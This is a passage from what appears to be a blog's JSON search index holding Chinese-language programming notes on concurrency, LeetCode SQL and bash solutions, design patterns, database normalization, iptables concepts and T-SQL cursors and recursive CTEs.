其實就是pipe，但如何synchronize? 在讀或寫的時候，不能被打斷 並block在讀不到資料時(除非pipe有buffer可以存資料，這樣寫就不會block)\nactor與channel可以當成把queue從actor抽出來 獨立讓任何process都能存取\n","permalink":"https://littlebees.github.io/2020/07/seven-concurrency-models-in-seven-weeks-%E9%83%A8%E5%88%86%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e感覺自己不曾了解過Concurrent programming，所以來看這本\n看能不能得到一些直覺\u003c/p\u003e","title":"Seven-Concurrency-Models-in-Seven-Weeks 部分筆記"},{"content":"動機 leetcode 上解 sql，潮\n同時熟悉sql怎麼用\n一些常用的工具 CTE (Common Table Expression) 就是把subquery抽到前面去\n但比起subquery，cte的table可以reference to self 可以遞迴！！\nwindow function 可以把table的部分資料割出來做計數與排名\n常用的是 rank與dense_rank\n兩個的差別是在重複的資料出現時 rank不會列在同一名 dense_rank會列在同一名\n手法 消除重複 group by window function distinct 列舉 self join void empty table =\u0026gt; 所有條件式沒一個符合 null =\u0026gt; left join 時沒有相對應的值 把empty table轉成null case + exists max() 題目 沒有鎖的一共19題\n175. Combine Two Tables left join\nselect a.FirstName, a.LastName, b.City, b.State from Person a left join Address b on a.PersonId = b.PersonId; 176. Second Highest Salary 用rank對每一區排序找出第二名 但是題目有要求如果為空要是null 但如果where找不到東西的話，整個表是空的！！\n所以還要在所以還要再包一層max，如果沒東西就會自動轉成null！！\nselect max(a.Salary) SecondHighestSalary from (select Salary from (select id, Salary, rank () OVER (ORDER BY Salary desc) rk from Employee) b where rk = 2) a; 177. Nth Highest Salary 上一題的延續，但是排名是要可以重複的 所以要改成dense_rank\nCREATE FUNCTION getNthHighestSalary(N INT) RETURNS INT BEGIN RETURN ( # Write your MySQL query statement below. select max(a.Salary) from (select Salary from (select id, Salary, dense_rank () OVER (ORDER BY Salary desc) rk from Employee) b where rk = N) a ); END 178. Rank Scores 都寫著rank了 就是用rank 不過因為是要重複排名所以要用dense_rank\nselect score, dense_rank () over (order by score desc) `Rank` from Scores; 180. Consecutive Numbers 這裡點出sql的programming想法\n用組合出所有需要的資料在同一個row 再用條件篩掉 再從中產生新的資料，丟到新的table 反覆放資料到table讓下一個table使用\n這裡的條件是 兩個row的\n數字 id 要一樣 但我們需要至少三個row同時成立 所以就join兩次這樣就有三個row了\nselect distinct a.Num ConsecutiveNums from Logs a join Logs b on a.Num = b.Num and a.Id = b.Id+1 join Logs c on a.Num = c.Num and a.Id = c.Id+2 181. Employees Earning More Than Their Managers 就是join\nselect A.Name Employee from Employee A join Employee B on A.ManagerId = B.Id where A.Salary \u0026gt; B.Salary 182. Duplicate Emails group by可以把同樣的column的集合在一起 再看集合在一起的row有多少個\nselect Email from Person group by Email having count(Email) \u0026gt; 1 183. Customers Who Never Order left join才會有null!!\nselect name Customers from Customers left join Orders on Orders.CustomerId = Customers.id where CustomerId is null 184. Department Highest Salary 先生出有rk的表 再挑出rk是1的\nwith a as ( select Id, Name, Salary, DepartmentId, dense_rank () over (partition by DepartmentId order by Salary desc) rk from Employee ) select B.Name Department, A.Name Employee, A.Salary from A join Department B on B.Id = A.DepartmentId where A.rk = 1 185. Department Top Three Salaries 與前一題差不多 但我寫了兩個版本\nver.1 用or去組出來\nwith a as ( select *, dense_rank () over (partition by DepartmentId order by Salary desc) rk from Employee ) select b.Name Department , a.Name Employee, a.Salary from a join Department b on b.Id = a.DepartmentId where a.rk =1 or a.rk = 2 or a.rk = 3 ver.2 小於3\n理所當然的，這個效能比較好\nwith a as ( select *, dense_rank () over (partition by DepartmentId order by Salary desc) rk from Employee ) select b.Name Department , a.Name Employee, a.Salary from a join Department b on b.Id = a.DepartmentId where a.rk \u0026lt;= 3 196. Delete Duplicate Emails 用rank來結合同樣的email同時標上rank 之後把rk大於1的delete就好了\nwith A as (select Id, ROW_NUMBER() OVER (PARTITION BY Email order by Id) AS rk from Person) delete from Person where Id = Any(select Id from A where A.rk \u0026gt; 1) 197. Rising Temperature 與180很像\nselect A.Id from Weather A join Weather B on B.RecordDate = subdate(A.RecordDate,1) where A.Temperature \u0026gt; B.Temperature 262. Trips and Users 把沒有ban的與在期限內的row找出來 分別算 同一天的總交易數 與 同一天的完成交易數 算比率，處理當天沒有任何完成交易的狀態 with ts as ( select Trips.Status, Trips.Request_at from Trips join Users a on Trips.Client_Id = a.Users_Id join Users b on Trips.Driver_Id = b.Users_Id where a.Banned = \u0026#39;No\u0026#39; and b.Banned = \u0026#39;No\u0026#39; and Trips.Request_at BETWEEN \u0026#39;2013-10-01\u0026#39; AND \u0026#39;2013-10-03\u0026#39; ), a as ( select *, count(*) cnt from ts group by Status, Request_at ), base as ( select sum(cnt) cnt, Request_at from a group by Request_at ), comp as ( select * from a where Status = \u0026#39;completed\u0026#39; ) select base.Request_at Day, IF(comp.cnt is not null, cast(1.0- (comp.cnt/base.cnt) as decimal(10,2)), 1.00) `Cancellation Rate` from base left join comp on base.Request_at = comp.Request_at 595. Big Countries 複習基本sql用\nselect name, population ,area from World where area \u0026gt; 3000000 or population \u0026gt; 25000000 596. Classes More Than 5 Students 先用student與class group在一起 排除同一個學生在同一個class有兩個以上的學生\n在group class找出題目要的東西\nwith a as (select * from courses group by student, class ) select class from a group by class having count(*) \u0026gt;= 5 601. Human Traffic of Stadium 與180很像但是這次要table中符合條件的row 所以如果用與180同樣的做法還要多一個步驟是 把join完的row拆回去原本的row\nwith a as ( select * from stadium where people \u0026gt;= 100 ), b as ( select x.id id1, x.visit_date visit_date1, x.people people1, y.id id2, y.visit_date visit_date2, y.people people2, z.id id3, z.visit_date visit_date3, z.people people3 from a x join a y on x.id = y.id+1 join a z on y.id = z.id+1 ), c as ( select id1 id, visit_date1 visit_date, people1 people from b union all select id2, visit_date2, people2 from b union all select id3, visit_date3, people3 from b ) select distinct * from c order by id 620. Not Boring Movies 複習基本sql\nselect id, movie, description , rating from cinema where id % 2 = 1 and description != \u0026#39;boring\u0026#39; order by rating desc 626. Exchange Seats 這題應該是所有sql題中讓我最愉悅的一題\nver.1 把奇數的id加一再把偶數的id減1 但這樣有問題如果row總數是奇數的話最後一筆會出事 所以要特別處理！！\nwith a as ( select id+1 id, student from seat where id%2 = 1 union all select id-1, student from seat where id%2 = 0 ), b as ( select * from a where id = 1 union all select x.id, x.student from a x, a y where x.id = y.id+1 union all select (select count(id) from a), a.student from a where id = (case when ((select count(id) from a) % 2) = 1 then (select max(id) from a) else 0 end) ) select * from b order by id ver.2 ver1把奇數的id與偶數的id分成兩個table 再用union all接起來\n但其實只要針對id做case就好了\u0026hellip;\nwith a as ( select count(*) total from seat ) select (case when ((seat.id%2)=1) and seat.id != a.total then seat.id+1 when ((seat.id%2)=1) and seat.id = a.total then seat.id else seat.id-1 end) id, seat.student from seat, a order by id 627. Swap Salary 延續626的想法針對想要的欄位做case 這裡對sex做case就可以了\nupdate salary set sex = (case sex when \u0026#39;m\u0026#39; then \u0026#39;f\u0026#39; else \u0026#39;m\u0026#39; end) ","permalink":"https://littlebees.github.io/2020/07/leetcode%E4%B8%8A%E7%9A%84sql%E9%A1%8C/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eleetcode 上解 sql，潮\u003c/p\u003e\n\u003cp\u003e同時熟悉sql怎麼用\u003c/p\u003e","title":"leetcode上的sql題"},{"content":"物件與lambda 物件其實就是使用前需要new的lambda\n但\n物件可以有一個以上的function 可以用繼承來傳function給父類別 Factorys 就是把物件生成抽象化\nsimple factory 把物件生成的code抽成物件(lambda)\n用參數傳function\nmethod factory 把物件生成的code抽成要實作的方法\n用override傳function\nabstract factory 把所有物件生成的code\n放到物件中 讓子類別實作 就simple factory+method factory 但實作method從caller本身被抽到另一個物件去\n簡介 接著來介紹pattern的替代方案\n替代方案: lambda Strategy 拉一個interface來產生一個給lambda的洞(attribute)\nTemplate Method 拉好幾個abstract method給子類別實做需要用到的method\nBridge 把許多function放在一起\ndict with lots of lambda\nObserver 存callback函數，再把資料透過callback推送出去\nCommand 真的就是lambda\n替代方案: Rrcursive data type Decorator data List = Base | Node A List 就是List的type，但是可能會有許多base\ninterface layer { int eval(); } class Base implements layer { int eval() { return 0;} } class add10 implements layer { layer next; public add10(layer l) { next = l; } int eval() { return 10+next.eval(); } } Chain of Responsibility linked list\nabstract class Handler { protected Handler next; Handler(Handler next) { this.next = next; } void doNext(char c) { if(next != null) { next.handle(c); } } abstract void handle(char c); } class SymbolHandler extends Handler { SymbolHandler(Handler next) { super(next); } void handle(char c) { System.out.println(\u0026#34;Symbol has been handled\u0026#34;); doNext(c); } } public class Main { public static void main(String[] args) { Handler handler = new SymbolHandler( new CharacterHandler( new DigitHandler(null))); handler.handle(\u0026#39;A\u0026#39;); handler.handle(\u0026#39;1\u0026#39;); } } (不過看著看著感覺有點monad的味道)\nComposite data Tree = Leaf | Node List\u0026lt;A\u0026gt; List\u0026lt;Tree\u0026gt; 就是Tree的type，但是可能會有許多leaf\nBuilder Q: 回傳的都是同一個type，那狀態如何變化? A: 放在attribute\n每次set完attribute就回傳Builder，最後再產生物件\nState 把State Machine的State變成物件，之後每個State就依據呼叫的method來執行動作，與轉換狀態。\n換言之，用linked list的方式實作graph\n替代方案: Type constructor Adapter 就是吃一個type，透過method使用 那就是Type constructor阿\nType + Adapter =\u0026gt; another Type\nProxy 與Adapter很像，但轉出來的不是只有一般的type 連帶還有存取的方法 有點像python的decorator\nType + Proxy =\u0026gt; methods for Type\n想法 Singleton 就是只能有一個物件 那做的方法就有很多了\nPrototype deepCopy\nFlyweight 記憶法\nFacade 打包成一個函數(或是公開介面)\nIterator 把hasNext與getNext明確出來，可以變成method調用\n實做起來很有趣，Tree的Iterator一定要試試看\nInterpreter 就是Interpreter，看操作語意可以給你許多啟發\nMemento 可以當成物件的序列化與反序列化\n保存能代表物件的狀態，之後只要使用這些狀態就能還原出物件\nMediator 很像 Facade, Template Method 都是打包\n但 Facade, Template Method 打包的是method Mediator 打包的是 物件\n替代方案: pattern matching Visitor 物件本身的attribute就是函數的參數\nsize [] = 0 size a:x = 1+size x interface ListVisitor {// Lambda int apply(Base l); int apply(Node l); } interface List { List getNext(); } class size implements ListVisitor { // 其實也可以把ret寫在attribute // 這樣就不用回傳type了 int apply(Base l) { return 0; } int apply(Node l) { return 1+l.apply(this); } } class Base implements List { List getNext() { return null; } int apply(ListVisitor f) { return f.accept(this); } } class Node implements List { List next; public Node(List l) { next = l; } List getNext() { return next; } int apply(ListVisitor f) { return f.accept(this); } } ","permalink":"https://littlebees.github.io/2020/07/design-pattern%E9%9A%A8%E4%BE%BF%E7%AD%86%E8%A8%98/","summary":"物件與lambda 物件其實就是使用前需要new的lambda\n但\n物件可以有一個以上的function 可以用繼承來傳function給父類別 Factorys 就是把物件生成抽象化\nsimple factory 把物件生成的code抽成物件(lambda)\n用參數傳function\nmethod factory 把物件生成的code抽成要實作的方法\n用override傳function\nabstract factory 把所有物件生成的code\n放到物件中 讓子類別實作 就simple factory+method factory 但實作method從caller本身被抽到另一個物件去\n簡介 接著來介紹pattern的替代方案\n替代方案: lambda Strategy 拉一個interface來產生一個給lambda的洞(attribute)\nTemplate Method 拉好幾個abstract method給子類別實做需要用到的method\nBridge 把許多function放在一起\ndict with lots of lambda\nObserver 存callback函數，再把資料透過callback推送出去\nCommand 真的就是lambda\n替代方案: Rrcursive data type Decorator data List = Base | Node A List 就是List的type，但是可能會有許多base\ninterface layer { int eval(); } class Base implements layer { int eval() { return 0;} } class add10 implements layer { layer next; public add10(layer l) { next = l; } int eval() { return 10+next.","title":"design pattern隨便筆記"},{"content":"動機 突然想起來 有這種東西 就來重看一下\n相依(叫參照或許比較好) 可以把table想成某種dict， 而這個dict的key是一種pair， 而pair丟到dict中，如果拿到只有一筆資料就是一種鍵 也就是相依\n像是用學號去找就只會找到一個學生\n一般來說會有許多種pair都可以拿到只有一筆資料，這個叫超鍵 把超鍵的項目去掉，去到不能再去掉就是候選鍵(對，這也可能有許多組合，學號、身分證) 從候選鍵選一種喜歡的就是主鍵\n大概寫成code(pseudo-python)\ntable = {...} superKey = [tup for tup in all_combination(table.keys()) if len(table[tup]) == 1].sort(key=lambda tup: len(tup)) def candicateKey(): keysIter = iter(superKey) yield next(keysIter) keys = candicateKey() for tup in keys: yielded = False for possible_key in keysIter: if tup.is_subset(possible_key): continue else: yield possible_key yielded = True if not yielded: raise StopIteration() 1NF 就是為了因應row不能放可變長度的array所以要把Item轉90度，也因為這樣我們有了後面的種種NF\n至於那些新增、刪除與修改異常都是因為當初存可變長度的array的row不是struct 所以不可以用pointer直接改，要轉90度重複寫下原本struct的其他資料\n2NF 其實接下去的NF都是把可以推導出來(或是叫找出)的item抽出去\n看主鍵外的資料與主鍵的關係 部分相依 只有與主鍵的單個項目相依 完全相依 與主鍵的所有項目相依 2NF就是把(針對主鍵的)部分相依抽出去，像A,B是主鍵\n{A,B} -\u0026gt; {D, E, F} {B} -\u0026gt; {D, F}\nD,F就是對B部分相依\n像是有一個成績table student ID, course ID, name, 總排名, grade\nname與總排名很明顯只與student ID有關，所以可以抽出去\n3NF 現在可依透過所有主鍵去filter出所有資料 3NF要看其他欄位能不能filter出其他資料\n換言之，就是看主鍵外的資料有沒有與主鍵外的資料相依\n這是在公三小?\n像B是主鍵 {B} -\u0026gt; {D, F} {D} -\u0026gt; {F} 這樣可以把F抽出去，這就是3NF想做的\n前面分出來的table student ID,name, 總排名 在此name可以filter出總排名\n所以還要再把name割出來\n遞移相依: 像上面F就是透過D相依B，這就是遞移相依\n2NF與3NF差在? 2NF是處理部分主鍵的相依 3NF是處理非主鍵的相依\n但一般處理相依，或者應該說是分類cloumn，都是直接把有關的放在一起 所以，2NF與3NF看起來很像，因為都是處理重複的相依，但是兩者的範疇不同 同時順序也不一定或是先2NF再3NF\nBCNF 看有沒有不為主鍵的項目可以相依到主鍵的某個項目? 有的話就抽出去把cycle打斷\n假設 {A,B}是主鍵 但 {A, B} -\u0026gt; {C} {C} -\u0026gt; {B} 這樣就是一個cycle的fu\n所以可以拆掉，有不同的拆法\n{A,C} 為主鍵，把{B,C}拉到另一張表 {A,B} 為主鍵，把{B,C}拉到另一張表 ","permalink":"https://littlebees.github.io/2020/07/db%E6%AD%A3%E8%A6%8F%E5%8C%96%E7%9A%84%E9%9A%A8%E4%BE%BF%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e突然想起來 有這種東西\n就來重看一下\u003c/p\u003e","title":"db正規化的隨便筆記"},{"content":"動機 記錄下自己怎麼看待iptables\niptables把firewall的功能與network stack緊緊地結合在一起 所以有的時候會看不懂到底發生甚麼事，也不好寫出自己想要的rule 故在此寫下自己的看法\ntable : something like java\u0026rsquo;s interface firewall的功能有二\n接受/拒絕pkt 修改pkt 所以firewall會改pkt的內容(mangle,nat)，之後根據使用者的rule做接受/拒絕(filter) 最後再return (先不算中間直接離開的情況)\n整個流程大概像\nmangle -\u0026gt; nat -\u0026gt; filter \u0026lt;= 這段是進入 | \\ / mangle \u0026lt;- nat \u0026lt;- filter \u0026lt;= 這段是出去 同樣都是修改pkt，因為nat太常用了就被獨立出來\ntable可以當成pkt在firewall中是怎麼被處理的概述，很像OO的interface pkt會被某種程度的改動 =\u0026gt; mangle 在sport/dport/sip/dip改動 =\u0026gt; nat firewall的business rule =\u0026gt; filter\nchain all about routing 一個封包進入主機，會判斷\n我該處理嗎? \u0026lt;= 所以有兩個chain 最後再丟出去。 所以有\nPREROUTING INPUT FORWARD OUTPUT POSTROUTING 寫成code\nPREROUTING() if this_pkt_is_for_this_host(): INPUT() OUTPUT() else: FORWARD() POSTROUTING() 把chain與table組合一下就是wiki的這張圖 Netfilter Hooks 當pkt在network stack中流動時，會觸發netfilter的hook，再調用註冊再裡面的函數對pkt做處理 可以看到每個hook都可以與上面的五個chain對起來\nNF_IP_PRE_ROUTING NF_IP_LOCAL_IN NF_IP_FORWARD NF_IP_LOCAL_OUT NF_IP_POST_ROUTING function \u0026amp; jump 每個chain都有許多rule，而這些rule就可以想成一般寫程式的指令 以剛剛的想法為基礎，這些chain就可以想像成function!!\n但是不同於一般的function被call完後會自動回到的被call的位置\nchain中的rule只要碰到ACCEPT/DROP/REJECT/QUEUE其中一個action，就不會繼續往下跑 其他都是繼續往下走，如果沒有rule可以執行，就會觸動chain的預設action\n順便提一下\n自定義的chain的預設action是RETURN，就是我們熟悉的return QUEUE會把pkt轉到userspace DROP/REJECT 都是丟到pkt，但是REJECT還會回傳訊息給sender\nconnection state if is_tracked(): # 1. 要不要track if is_nat(): # 2. 是不是nat if is_from_dnat(): return DNAT() else: return SNAT() else: if is_from_existing_conn(): return ESTABLISHED() elif is_related_to_existing_conn(): return RELATED() else: try: return NEW() except: return INVALID() else: return UNTRACKED() #這個與raw有關 mark: custom state mark有兩種\nconnmark (ctmark) mark (nfmark) 一個是針對connection的一個是針對個別封包的\n除了基本的set-mark 還有\nsave-mark: 把mark寫到connmark restore-mark: 把connmark寫到mark Ref 十分詳細必看\n","permalink":"https://littlebees.github.io/2020/07/%E9%9A%A8%E6%84%8Fiptables%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄下自己怎麼看待iptables\u003c/p\u003e\n\u003cp\u003eiptables把firewall的功能與network stack緊緊地結合在一起\n所以有的時候會看不懂到底發生甚麼事，也不好寫出自己想要的rule\n故在此寫下自己的看法\u003c/p\u003e","title":"隨意iptables筆記"},{"content":"動機 整理一些sql的用法\n把SQL當成一種奇怪的PL 與awk有點像，SQL的溝通單位只有類似matrix的資料結構 不過這個matrix沒辦法用index取值\n同時每家DBMS的實作又有點差別像是CTE的部分就差很多\n產生matrix(table) subquery 最基本的產生matrix的手段 最好都要替每個subquery加命名\nSELECT P_Name FROM products_taiwan WHERE P_Name NOT IN (SELECT P_Name FROM products_china) china; view 當成matrix的抽象\nCREATE VIEW V_Customer AS (SELECT First_Name, Last_Name, Country FROM Customer); function (\u0026amp; stored procedure) 可以產生table也可以產生value\nCREATE FUNCTION Sales.ufn_SalesByStore (@storeid int) RETURNS TABLE AS RETURN ( SELECT P.ProductID, P.Name, SUM(SD.LineTotal) AS \u0026#39;Total\u0026#39; FROM Production.Product AS P JOIN Sales.SalesOrderDetail AS SD ON SD.ProductID = P.ProductID JOIN Sales.SalesOrderHeader AS SH ON SH.SalesOrderID = SD.SalesOrderID JOIN Sales.Customer AS C ON SH.CustomerID = C.CustomerID WHERE C.StoreID = @storeid GROUP BY P.ProductID, P.Name ); procedure基本上就是把指令打包在一起 但沒有回傳值\nCREATE PROCEDURE HumanResources.uspGetEmployeesTest2 @LastName nvarchar(50), @FirstName nvarchar(50) AS SELECT FirstName, LastName, Department FROM HumanResources.vEmployeeDepartmentHistory WHERE FirstName = @FirstName AND LastName = @LastName AND EndDate IS NULL; GO 從python來看sql assign EmpIDVariable = max([row[\u0026#39;EmployeeID\u0026#39;] for row in HumanResources.Employee]) DECLARE @EmpIDVariable int; SELECT @EmpIDVariable = MAX(EmployeeID) FROM HumanResources.Employee; while MyCounter = 0 TestTable = [] # queue while MyCounter \u0026lt; 26: TestTable.append((MyCounter,char(int(\u0026#39;a\u0026#39;)+MyCounter))) MyCounter += 1 DECLARE @MyCounter int; SET @MyCounter = 0; WHILE (@MyCounter \u0026lt; 26) BEGIN; INSERT INTO TestTable VALUES (@MyCounter, CHAR((@MyCounter + ASCII(\u0026#39;a\u0026#39;)))); SET @MyCounter = @MyCounter + 1; END; cursor 基本款 vend_cursor = iter(Purchasing.Vendor) next(vend_cursor) DECLARE vend_cursor CURSOR FOR SELECT * FROM Purchasing.Vendor OPEN vend_cursor FETCH NEXT FROM vend_cursor; 兩個iterator 為什麼要提兩個的iterator? 因為sql的has_next是變數 所以比較特別 所以再貼一個例子\nvendor_id, vendor_name, message, product = (0,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;) print(\u0026#39;-------- Vendor Products Report --------\u0026#39;) vendor_cursor = iter(sorted([{\u0026#39;VendorID\u0026#39;: row[\u0026#39;VendorID\u0026#39;], \u0026#39;Name\u0026#39;: row[\u0026#39;Name\u0026#39;]} for row in Purchasing.Vendor if row[\u0026#39;PreferredVendorStatus\u0026#39;] == 1],key=lambda row: row[\u0026#39;VendorID\u0026#39;])) vendor_id, vendor_name = next(vendor_cursor) # it\u0026#39;s tedious to access each element by key, so imagine it can be done by deconstruct \u0026gt;_! while has_next(vendor_cursor): \u0026#39;\u0026#39;\u0026#39; In fact, WHILE @@FETCH_STATUS = 0 is euqal to while hasnext(vendor_cursor). However, python don\u0026#39;t have hasnext for its iterator. Instead, python iterator will throw an exception at the end of iteration. Here, imagine we have has_next() in python, okay. \u0026#39;\u0026#39;\u0026#39; print(\u0026#39; \u0026#39;) message = \u0026#39;----- Products From Vendor: \u0026#39; + vendor_name print(message) product_cursor = iter([...]) # it\u0026#39;s tedious to implement this, so skip it product = next(product_cursor) for product in product_cursor: message = \u0026#39; \u0026#39; + product # python iterator need not to be deallocated, after it accomplish its purpose vendor_id, vendor_name = next(vendor_cursor) # python iterator need not to be deallocated, after it accomplish its purpose DECLARE @vendor_id int, @vendor_name nvarchar(50), @message varchar(80), @product nvarchar(50); PRINT \u0026#39;-------- Vendor Products Report --------\u0026#39;; DECLARE vendor_cursor CURSOR FOR SELECT VendorID, Name FROM Purchasing.Vendor WHERE PreferredVendorStatus = 1 ORDER BY VendorID; OPEN vendor_cursor FETCH NEXT FROM vendor_cursor INTO @vendor_id, @vendor_name WHILE @@FETCH_STATUS = 0 BEGIN PRINT \u0026#39; \u0026#39; SELECT @message = \u0026#39;----- Products From Vendor: \u0026#39; + @vendor_name PRINT @message DECLARE product_cursor CURSOR FOR SELECT v.Name FROM Purchasing.ProductVendor pv, Production.Product v WHERE pv.ProductID = v.ProductID AND pv.VendorID = @vendor_id -- Variable value from the outer cursor OPEN product_cursor FETCH NEXT FROM product_cursor INTO @product IF @@FETCH_STATUS \u0026lt;\u0026gt; 0 PRINT \u0026#39; \u0026lt;\u0026lt;None\u0026gt;\u0026gt;\u0026#39; WHILE @@FETCH_STATUS = 0 BEGIN SELECT @message = \u0026#39; \u0026#39; + @product PRINT @message FETCH NEXT FROM product_cursor INTO @product END CLOSE product_cursor DEALLOCATE product_cursor FETCH NEXT FROM vendor_cursor INTO @vendor_id, @vendor_name END CLOSE vendor_cursor; DEALLOCATE vendor_cursor; case 有趣的部份是除了回傳data外，還可以回傳column name\nSELECT OrderID, Quantity, CASE WHEN Quantity \u0026gt; 30 THEN \u0026#39;The quantity is greater than 30\u0026#39; WHEN Quantity = 30 THEN \u0026#39;The quantity is 30\u0026#39; ELSE \u0026#39;The quantity is under 30\u0026#39; END AS QuantityText FROM OrderDetails; SELECT CustomerName, City, Country FROM Customers ORDER BY (CASE WHEN City IS NULL THEN Country ELSE City END); 遞迴 (table as queue) When we iterate a tbale in sql, the only element we can access is the first row of its table. And then, the second, the third and so on.\nWhen we want to insert a new row to a table, this row will be inserted at the tail of the table.\nWait, it\u0026rsquo;s like something we are familiar with.\nQueue!!\nWITH node AS --queue declare ( SELECT id,parentid,num FROM testtable AS TREE WHERE parentid = 0 UNION ALL /* init argument where we start bfs */ -- enqueue the neighbors SELECT TREE.id,TREE.parentid,TREE.num FROM testtable AS TREE INNER JOIN node AS QUEUE ON QUEUE.id = TREE.parentid /*從bfs的節點找下一個node，推到queue*/ ) SELECT QUEUE.id,Count(TREE.id) AS subnode FROM node AS QUEUE LEFT JOIN testtable AS TREE ON QUEUE.id = TREE.parentid GROUP BY QUEUE.id 最短路徑 source\nWITH paths (node, path, cost, rnk, lev) AS ( -- priority queue SELECT a.dst, a.src || \u0026#39;,\u0026#39; || a.dst, a.distance, 1, 1 FROM arcs a WHERE a.src = :SRC UNION ALL SELECT a.dst, p.path || \u0026#39;,\u0026#39; || a.dst, p.cost + a.distance, Rank () OVER (PARTITION BY a.dst ORDER BY p.cost + a.distance), -- tree被更新就sort一次quere(part of this table) p.lev + 1 FROM paths p JOIN arcs a ON a.src = p.node AND p.rnk = 1 ) SEARCH DEPTH FIRST BY node SET line_no -- oracle DB的CTE特別語法: 用什麼方式traversal -- 這邊改成bfs應該沒關係，但沒試驗過 CYCLE node SET lp TO \u0026#39;*\u0026#39; DEFAULT \u0026#39; \u0026#39; -- oracle DB的CTE特別語法: 要判斷cycle -- 上面把所有路線都展開，在展開同時對目前找到的做sort , paths_ranked AS ( SELECT lev, node, path, cost, Rank () OVER (PARTITION BY node ORDER BY cost) rnk_t, lp, line_no FROM paths WHERE rnk = 1 ) -- 從每個queue挑出最好的結果 SELECT LPad (node, 1 + 2* (lev - 1), \u0026#39;.\u0026#39;) node, lev, path, cost, lp FROM paths_ranked WHERE rnk_t = 1 ORDER BY line_no -- print result ","permalink":"https://littlebees.github.io/2020/07/%E9%9A%A8%E4%BE%BF%E7%9A%84sql%E7%AD%86%E8%A8%98/","summary":"動機 整理一些sql的用法\n把SQL當成一種奇怪的PL 與awk有點像，SQL的溝通單位只有類似matrix的資料結構 不過這個matrix沒辦法用index取值\n同時每家DBMS的實作又有點差別像是CTE的部分就差很多\n產生matrix(table) subquery 最基本的產生matrix的手段 最好都要替每個subquery加命名\nSELECT P_Name FROM products_taiwan WHERE P_Name NOT IN (SELECT P_Name FROM products_china) china; view 當成matrix的抽象\nCREATE VIEW V_Customer AS (SELECT First_Name, Last_Name, Country FROM Customer); function (\u0026amp; stored procedure) 可以產生table也可以產生value\nCREATE FUNCTION Sales.ufn_SalesByStore (@storeid int) RETURNS TABLE AS RETURN ( SELECT P.ProductID, P.Name, SUM(SD.LineTotal) AS \u0026#39;Total\u0026#39; FROM Production.Product AS P JOIN Sales.SalesOrderDetail AS SD ON SD.ProductID = P.ProductID JOIN Sales.SalesOrderHeader AS SH ON SH.","title":"隨便的sql筆記"},{"content":"動機 onlinejudge居然有bash的題目!! 這麼有趣的東西當然是解爆阿!!\n抱怨 有的時候會出現\nrbash: ./prog.sh: Permission denied 這個時候就是只能調整輸入像用pipe等等\n題目 目前只有4題\n192 193 194 195 192 cat words.txt | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39; | sed \u0026#39;/^[[:space:]]*$/d\u0026#39; | sort | uniq -c | nawk \u0026#39;{print $1\u0026#34; \u0026#34;$2}\u0026#39; | sort -r -n -k 1 | nawk \u0026#39;{print $2\u0026#34; \u0026#34;$1}\u0026#39; bash做為一個奇怪的PL bash可以想成只有string的PL\n那要怎麼表現array? 用delimiter區分，常見的是\nspace newline comma etc\u0026hellip; 第一步: 多個array合成一條array 先把空白換成斷行 把多的斷行吃掉 故最後會變成 1 2 3 =\u0026gt; 1 2 3 cat words.txt | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39; | sed \u0026#39;/^[[:space:]]*$/d\u0026#39; 第二步: 計數 先排好，再計算重複的單字\n| sort | uniq -c 第三步: 依題目調整輸出 | nawk \u0026#39;{print $1\u0026#34; \u0026#34;$2}\u0026#39; | sort -r -n -k 1 | nawk \u0026#39;{print $2\u0026#34; \u0026#34;$1}\u0026#39; 193 cat file.txt | egrep \u0026#34;^\\([0-9][0-9][0-9]\\) [0-9][0-9][0-9][-][0-9][0-9][0-9][0-9]$|^[0-9][0-9][0-9][-][0-9][0-9][0-9][-][0-9][0-9][0-9][0-9]$\u0026#34; 這題就是regex\n194 cat file.txt | awk \u0026#39; { for (j=1; j\u0026lt;=NF; j++) { M[NR, j] = $j } } END { for (i=1; i\u0026lt;=NR; i++) { for (j=i+1; j\u0026lt;=NF; j++) { tmp = M[i,j] M[i,j] = M[j,i] M[j,i] = tmp } if (NR \u0026gt; NF) { for (j=NF+1; j\u0026lt;=NR; j++) { tmp = M[i,j] M[i,j] = M[j,i] M[j,i] = tmp } } } for (i=1; i\u0026lt;=NF; i++) { for (j=1; j\u0026lt;NR; j++) { printf \u0026#34;%s \u0026#34;, M[i,j] } print M[i, NR] } }\u0026#39; awk與sed的使用時機 同樣都是一行一行處理，但是 sed只處理單行，把每行當成string awk可以深入到每個item(在awk叫field)，把每行當成array\n所以一般來說sed常看到用在replace或是print需要的一整行 而awk會用在挑出在那一行中需要的item\nawk的運作方式 一次讀一行，同時幫你分成array(index from 1)\n哪要怎麼知道現在讀到第幾行? NR\n哪要怎麼知道現在的array長度? NF\n所以如果寫成python會像\nwith open(\u0026#39;file.txt\u0026#39;) as f: NR = 0 for line in f: NR += 1 arr = \u0026#39; \u0026#39;.split(line) your_awk_prog(arr, NF=len(arr), NR=NR) 除了針對每一行的部分，還有\nawk啟動前(還沒讀檔，像是變數初始化的階段) awk讀完當案後(讀到EOF) 可以執行的hook 195 chmod a+x file.txt # for handling Permission denied sed \u0026#39;10q;d\u0026#39; file.txt 就是sed參考前面的 awk與sed的使用時機\n","permalink":"https://littlebees.github.io/2020/07/leetcode%E7%9A%84bash%E9%A1%8C%E7%9B%AE%E5%80%91/","summary":"動機 onlinejudge居然有bash的題目!! 這麼有趣的東西當然是解爆阿!!\n抱怨 有的時候會出現\nrbash: ./prog.sh: Permission denied 這個時候就是只能調整輸入像用pipe等等\n題目 目前只有4題\n192 193 194 195 192 cat words.txt | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39; | sed \u0026#39;/^[[:space:]]*$/d\u0026#39; | sort | uniq -c | nawk \u0026#39;{print $1\u0026#34; \u0026#34;$2}\u0026#39; | sort -r -n -k 1 | nawk \u0026#39;{print $2\u0026#34; \u0026#34;$1}\u0026#39; bash做為一個奇怪的PL bash可以想成只有string的PL\n那要怎麼表現array? 用delimiter區分，常見的是\nspace 